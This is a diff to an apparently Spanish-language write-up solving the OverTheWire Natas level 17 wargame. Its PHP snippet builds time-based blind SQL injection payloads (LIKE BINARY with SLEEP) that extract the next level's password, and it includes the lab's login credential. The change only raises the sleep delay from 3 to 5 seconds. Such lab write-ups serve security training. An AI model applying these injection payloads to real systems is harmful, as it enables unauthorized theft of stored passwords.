@@ -24,7 +24,7 @@ respuesta determinaremos el resultado de la misma.
 ```php
 $authorization = base64_encode("natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd");
 $url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
-$valid_time = 3;
+$valid_time = 5;
 
 function verify($inyection)
 {
@@ -52,18 +52,18 @@ function verify($inyection)
 
 function contains_inyection($substring)
 {
-    return "natas18\" AND password LIKE BINARY \"%$substring%\" AND SLEEP(3) != \"";
+    return "natas18\" AND password LIKE BINARY \"%$substring%\" AND SLEEP(5) != \"";
 }
 
 function startwith_inyection($start)
 {
-    return "natas18\" AND password LIKE BINARY \"$start%\" AND SLEEP(3) != \"";
+    return "natas18\" AND password LIKE BINARY \"$start%\" AND SLEEP(5) != \"";
 }
 
 
 function equals_inyection($password)
 {
-    return "natas18\" AND password LIKE BINARY \"$password\" AND SLEEP(3) != \"";
+    return "natas18\" AND password LIKE BINARY \"$password\" AND SLEEP(5) != \"";
 }
 ```
 
